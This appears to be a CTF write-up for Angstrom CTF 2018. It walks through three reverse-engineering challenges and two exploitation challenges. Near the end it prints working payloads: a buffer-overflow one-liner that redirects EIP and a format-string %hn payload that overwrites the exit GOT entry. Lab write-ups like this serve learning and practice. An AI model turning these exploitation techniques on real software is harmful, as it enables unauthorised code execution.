# Angstrom CTF 2018 
## Write up 

### RE1 

Description: 
```
One of the commmon categories in CTFs is Reverse Engineering, which involves using a dissassembler and other tools to figure out how an executable file works. For your first real reversing challenge, here is an ELF file.
```
```sh
file rev1_32 
```
```sh
rev1_32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f2b1747bed28ce0df99578bc745d7008d8cae2dd, not stripped
```
We can see it's a ELF 32 bit. 

I used radare2 just to look all function in it. 
```sh
radare2 rev1_32 
```

![Alt TAG](https://github.com/Dubzctf/writeup/blob/master/AngstromCTF2018/image/r2re1.png)
</br></br>We can see we have a main function. 
</br>So, We connect in ssh, execut it with GDB. 
```sh
gdb ./rev1_32 
#We stop at our main
b*main
#and run
r
#look our stack
n
```
We have our password in the stack : s3cret_pa55word
![Alt TAG](https://github.com/Dubzctf/writeup/blob/master/AngstromCTF2018/image/stackre1.png)
</br>Just run it with this password and you have your flag.

### RE2 

Description : 

```
It's time for Rev2! This one is pretty similar to the first: once you get the inputs right to the program, you will get the flag. You don't need the shell server for this one, but the binary can be found at /problems/rev2/ if you would like to run it there.
```
I started this challenge, to open this ELF 32 bit with IDA. 
</br>I find this pseudo code when my main is dessassembled : 
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [esp+1Ch] [ebp-1Ch]
  int v5; // [esp+20h] [ebp-18h]
  int v6; // [esp+24h] [ebp-14h]
  int v7; // [esp+28h] [ebp-10h]
  unsigned int v8; // [esp+2Ch] [ebp-Ch]

  v8 = __readgsdword(0x14u);
  puts("Welcome to Rev2! You'll probably want to use a dissassembler or gdb.");
  printf("Level 1: What number am I thinking of: ");
  __isoc99_scanf("%d", &v4);
  if ( v4 == 4567 )
  {
    printf(
      "Level 2: Which two two-digit numbers will solve this level. Enter the two numbers separated by a single space (num"
      "1 should be the lesser of the two): ");
    __isoc99_scanf("%d %d", &v5, &v6);
    if ( v5 <= 99 && v5 > 9 && v6 <= 99 && v6 > 9 && v5 <= v6 )
    {
      v7 = v5 * v6;
      if ( v5 * v6 == 3431 )
        printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", v4, v5, v6);
      else
        printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", v5, v6);
      result = 0;
    }
    else
    {
      puts("Numbers do not meet specifications. Try again!");
      result = 0;
    }
  }
  else
  {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", v4);
    result = 0;
  }
  return result;
}

```
We see, we have two level, this first solution is 4567 :
```c
 printf("Level 1: What number am I thinking of: ");
  __isoc99_scanf("%d", &v4);
  if ( v4 == 4567 )
```
And the second is the multiplication of 2 numbers equal 3431 with this particularity : 
```
Number1 <= 99 && Number1 > 9 && Number2 <= 99 && Number2 > 9 && Number1 <= v6
```
I taked my calculator to find the good answer and I find :
```
47 * 73 = 3431 
```
And the flag is : 

![Alt TAG](https://github.com/Dubzctf/writeup/blob/master/AngstromCTF2018/image/responsere2.png)

#### REV 3

Description : 
```
Let's try Rev 3! For this executable, you will need to figure out what input makes the program return "Correct". You don't need the shell server for this one, but the binary can be found at /problems/rev3/ on the shell server.
```
I started this challenge, to open this ELF 32 bit with IDA.
</br>We can see we have a encode function : 
```c
int __cdecl encode(char *s, int a2)
{
  int result; // eax
  int i; // [esp+8h] [ebp-10h]
  signed int v4; // [esp+Ch] [ebp-Ch]

  v4 = strlen(s);
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= v4 )
      break;
    *(_BYTE *)(i + a2) = (s[i] ^ 9) - 3;
  }
  return result;
}
``` 
I wrote a little script which allows me to reverse the encoding and display the flag. 

Solution : 
```python 
def decode(flag):
    print "".join([chr((ord(i)+3)^0x9) for i in flag])


flag = "egzloxi|ixw]dkSe]dzSzccShejSi^3q"
decode(flag)
```

### Rop to the top 

Description : 

```
Rop, rop, rop
Rop to the top!
Slip and slide and ride that rhythm...

Here's some binary and source. Navigate to /problems/roptothetop/ on the shell server to try your exploit out!
```
I start to dowload binary and source. 
</br> 
I open my GDB
```sh
gdb ./rop_to_the_top32
```
I create my pattern : 
```sh
gdb-peda$ pattern create 200
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

```
When I run it, I can see the data in my EIP : 0x41414641 ('AFAA'), so I try to find my pattern offset with this command : 
```sh
gdb-peda$ pattern offset AFAA
AFAA found at offset: 44
```
I can see my offset is found at 44.
</br> I can see more information with this command : 
```sh
gdb-peda$ pattern search
Registers contain pattern buffer:
EBP+0 found at offset: 40
EIP+0 found at offset: 44
Registers point to pattern buffer:
[EBX] --> offset 112 - size ~88
[ESP] --> offset 48 - size ~152
Pattern buffer found at:
0xffffd120 : offset    0 - size  200 ($sp + -0x30 [-12 dwords])
0xffffd3f9 : offset    0 - size  200 ($sp + 0x2a9 [170 dwords])
References to pattern buffer found at:
0xffffd114 : 0xffffd3f9 ($sp + -0x3c [-15 dwords])
0xffffd228 : 0xffffd3f9 ($sp + 0xd8 [54 dwords])
```
Now, I open radare2 just to find the address of the function the_top, in the C source I can see open the flag
```c
void the_top()
{

	system("/bin/cat flag");
}
```
```sh
shell$ radare2 rop_to_the_top32 
[0x080483e0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[0x080483e0]> afl
0x08048330    3 35           sym._init
0x08048370    1 6            sym.imp.getegid
0x08048380    1 6            sym.imp.strcpy
0x08048390    1 6            sym.imp.puts
0x080483a0    1 6            sym.imp.system
0x080483b0    1 6            sym.imp.__libc_start_main
0x080483c0    1 6            sym.imp.setresgid
0x080483d0    1 6            sub.__gmon_start_3d0
0x080483e0    1 33           entry0
0x08048410    1 4            sym.__x86.get_pc_thunk.bx
0x08048420    4 43           sym.deregister_tm_clones
0x08048450    4 53           sym.register_tm_clones
0x08048490    3 30           sym.__do_global_dtors_aux
0x080484b0    4 43   -> 40   entry1.init
0x080484db    1 25           sym.the_top
0x080484f4    1 43           sym.fun_copy
0x0804851f    4 122          main
0x080485a0    4 93           sym.__libc_csu_init
0x08048600    1 2            sym.__libc_csu_fini
0x08048604    1 20           sym._fini
[0x080483e0]> 
```
The address is : 0x080484db
</br> So, now I will try my buffer overflow
</br> I go connect in ssh to the challenge and execute this command : 
```sh
team209535@shell:/problems/roptothetop$ ./rop_to_the_top32 $(python -c 'print "a"*44+"\xdb\x84\x04\x08"')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```
I print 44 a, size off my offset, and in my EIP in execute my fonction the_top with his address. 

### Personnal letter 

Description : 
```
Have you ever gotten tired of writing your name in the header of a letter? Well now there’s a program (source)to do it for you! Navigate to /problems/letter/ on the shell server to try your exploit out!
```
Let's go for this binary challenge.
</br>I started to analyse my binary on my computer. 
</br>When I executed, I saw one input which ask enter 100 chars max and give a name to generate a letter for me, Ho :D ! 
</br>Ok, I try "%x" in input to see what we have on a stack. 
```sh
Enter Name (100 Chars max): 
%x
________________________________________
|                                      |
|                                      |
|  Dear ff9cf618,    
```
Good, we see what we have on a stack, if it's that do, it's probably a format string. 
</br>Now, I want to see all function with radare2 :
```sh
0x08048620    1 6            sub.__gmon_start_620
0x08048630    1 33           entry0
0x08048660    1 4            sym.__x86.get_pc_thunk.bx
0x08048670    4 43           sym.deregister_tm_clones
0x080486a0    4 53           sym.register_tm_clones
0x080486e0    3 30           sym.__do_global_dtors_aux
0x08048700    4 43   -> 40   entry1.init
0x0804872b    6 157          sym.printFlag
0x080487c8    7 831          sym.printCard
0x08048b07    1 221          sym.main
0x08048bf0    4 93           sym.__libc_csu_init
0x08048c50    1 2            sym.__libc_csu_fini
0x08048c54    1 20           sym._fini
```
We can see, we have a function, main and a function printFlag. I take the address of the function printFlag. We will need it. "0x0804872b"

</br></br>Now, I need to know the offset of our input on the stack, I will use it to target addresses on the memory. 
</br>First, I disassemble my main : 
```assembly
0x08048b07 <+0>:	lea    ecx,[esp+0x4]
   0x08048b0b <+4>:	and    esp,0xfffffff0
   0x08048b0e <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048b11 <+10>:	push   ebp
   0x08048b12 <+11>:	mov    ebp,esp
   0x08048b14 <+13>:	push   ecx
   0x08048b15 <+14>:	sub    esp,0x84
   0x08048b1b <+20>:	mov    eax,ecx
   0x08048b1d <+22>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048b20 <+25>:	mov    DWORD PTR [ebp-0x7c],eax
   0x08048b23 <+28>:	mov    eax,gs:0x14
   0x08048b29 <+34>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048b2c <+37>:	xor    eax,eax
   0x08048b2e <+39>:	call   0x8048580 <getegid@plt>
   0x08048b33 <+44>:	mov    DWORD PTR [ebp-0x74],eax
   0x08048b36 <+47>:	sub    esp,0x4
   0x08048b39 <+50>:	push   DWORD PTR [ebp-0x74]
   0x08048b3c <+53>:	push   DWORD PTR [ebp-0x74]
   0x08048b3f <+56>:	push   DWORD PTR [ebp-0x74]
   0x08048b42 <+59>:	call   0x8048610 <setresgid@plt>
   0x08048b47 <+64>:	add    esp,0x10
   0x08048b4a <+67>:	sub    esp,0x4
   0x08048b4d <+70>:	push   0x64
   0x08048b4f <+72>:	push   0x0
   0x08048b51 <+74>:	lea    eax,[ebp-0x70]
   0x08048b54 <+77>:	push   eax
   0x08048b55 <+78>:	call   0x8048600 <memset@plt>
   0x08048b5a <+83>:	add    esp,0x10
   0x08048b5d <+86>:	sub    esp,0xc
   0x08048b60 <+89>:	push   0x8048cb8
   0x08048b65 <+94>:	call   0x80485b0 <puts@plt>
   0x08048b6a <+99>:	add    esp,0x10
   0x08048b6d <+102>:	sub    esp,0xc
   0x08048b70 <+105>:	push   0x8048ce0
   0x08048b75 <+110>:	call   0x80485b0 <puts@plt>
   0x08048b7a <+115>:	add    esp,0x10
   0x08048b7d <+118>:	sub    esp,0xc
   0x08048b80 <+121>:	push   0x8048d1f
   0x08048b85 <+126>:	call   0x80485b0 <puts@plt>
   0x08048b8a <+131>:	add    esp,0x10
   0x08048b8d <+134>:	mov    eax,ds:0x804a060
   0x08048b92 <+139>:	sub    esp,0x4
   0x08048b95 <+142>:	push   eax
   0x08048b96 <+143>:	push   0x64
   0x08048b98 <+145>:	lea    eax,[ebp-0x70]
   0x08048b9b <+148>:	push   eax
   0x08048b9c <+149>:	call   0x8048560 <fgets@plt>
   0x08048ba1 <+154>:	add    esp,0x10
   0x08048ba4 <+157>:	sub    esp,0xc
   0x08048ba7 <+160>:	lea    eax,[ebp-0x70]
   0x08048baa <+163>:	push   eax
   0x08048bab <+164>:	call   0x80485d0 <strlen@plt>
   0x08048bb0 <+169>:	add    esp,0x10
   0x08048bb3 <+172>:	sub    eax,0x1
   0x08048bb6 <+175>:	mov    BYTE PTR [ebp+eax*1-0x70],0x0
   0x08048bbb <+180>:	sub    esp,0xc
   0x08048bbe <+183>:	lea    eax,[ebp-0x70]
   0x08048bc1 <+186>:	push   eax
   0x08048bc2 <+187>:	call   0x80487c8 <printCard>
   0x08048bc7 <+192>:	add    esp,0x10
   0x08048bca <+195>:	sub    esp,0xc
   0x08048bcd <+198>:	push   0x8048d3c
   0x08048bd2 <+203>:	call   0x80485b0 <puts@plt>
   0x08048bd7 <+208>:	add    esp,0x10
   0x08048bda <+211>:	sub    esp,0xc
   0x08048bdd <+214>:	push   0x0
   0x08048bdf <+216>:	call   0x80485c0 <exit@plt>

```
I see this executable call <exit@plt> at the end of the main. We will need to modify exit Global Offset Table(GOT) entry. 
</br>So, I breack my printf and run. 
```sh
gdb-peda$ b*printf
Breakpoint 1 at 0x8048540
gdb-peda$ r
Starting program: /personal_letter32 
Welcome to the personal letter program!
Give us your name, and we will generate a letter just for you!
Enter Name (100 Chars max): 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
And now, I will analyse the stack offsets :
```sh
gdb-peda$ telescope 30
0000| 0xffffd17c --> 0x8048ae2 (<printCard+794>:	add    esp,0x10)
0004| 0xffffd180 --> 0x804b980 ('_' <repeats 40 times>, "\n|", ' ' <repeats 38 times>, "|\n|", ' ' <repeats 38 times>, "|\n")
0008| 0xffffd184 --> 0xffffd1e8 ('A' <repeats 39 times>)
0012| 0xffffd188 --> 0x1c 
0016| 0xffffd18c --> 0xf7e7e15d (<setresgid+61>:	cmp    eax,0xfffff000)
0020| 0xffffd190 --> 0xf7fe4f39 (add    edi,0x180c7)
0024| 0xffffd194 --> 0x0 
0028| 0xffffd198 --> 0x0 
0032| 0xffffd19c --> 0x11 
0036| 0xffffd1a0 --> 0x27 ("'")
0040| 0xffffd1a4 --> 0x804b980 ('_' <repeats 40 times>, "\n|", ' ' <repeats 38 times>, "|\n|", ' ' <repeats 38 times>, "|\n")
0044| 0xffffd1a8 --> 0x804bab0 ("|  Dear ", 'A' <repeats 39 times>, ",|\n")
0048| 0xffffd1ac --> 0x804bb40 ("|  ", '_' <repeats 34 times>, "  |\n|  ", '_' <repeats 34 times>, "  |\n|  ", '_' <repeats 34 times>, "  |\n|  ", '_' <repeats 34 times>, "  |\n|  ", '_' <repeats 33 times>...)
0052| 0xffffd1b0 --> 0xffffd1e8 ('A' <repeats 39 times>)
0056| 0xffffd1b4 --> 0x0 
0060| 0xffffd1b8 --> 0xffffd258 --> 0x0 
0064| 0xffffd1bc --> 0x8048bc7 (<main+192>:	add    esp,0x10)
0068| 0xffffd1c0 --> 0xffffd1e8 ('A' <repeats 39 times>)
0072| 0xffffd1c4 --> 0x64 ('d')
0076| 0xffffd1c8 --> 0xf7f945c0 --> 0xfbad2288 
0080| 0xffffd1cc --> 0x8048b33 (<main+44>:	mov    DWORD PTR [ebp-0x74],eax)
0084| 0xffffd1d0 --> 0xf7ffda9c --> 0xf7fcf3e0 --> 0xf7ffd940 --> 0x0 
0088| 0xffffd1d4 --> 0x1 
0092| 0xffffd1d8 --> 0xf7fcf420 --> 0x80483d1 ("GLIBC_2.0")
0096| 0xffffd1dc --> 0xffffd304 --> 0xffffd498 ("/personal_letter32")
--More--(25/30)
0100| 0xffffd1e0 --> 0x0 
0104| 0xffffd1e4 --> 0x3e8 
0108| 0xffffd1e8 ('A' <repeats 39 times>)
0112| 0xffffd1ec ('A' <repeats 35 times>)
0116| 0xffffd1f0 ('A' <repeats 31 times>)
```
As you can see, our input’s buffer is starts at offset 104 which is the 26th argument for the printf. We set the 26th and 27th arguments with the first 8 bytes of our payload to write to different BYTEs to the memory instead of writing a single WORD.
</br>Now, let's go to write our script with these informations. 
```sh
python -c 'print "\x32\xa0\x04\x08\x30\xa0\x04\x08%2036x"+"%26$hn%32551x%27$hn"' | ./personnal_letter32
```
This part : "\x32\xa0\x04\x08\x30\xa0\x04\x08%2036x" write byte by byte in hexa.
</br>This part "%26$hn%32551x%27$hn" Write on a good addresses memory our payload. 


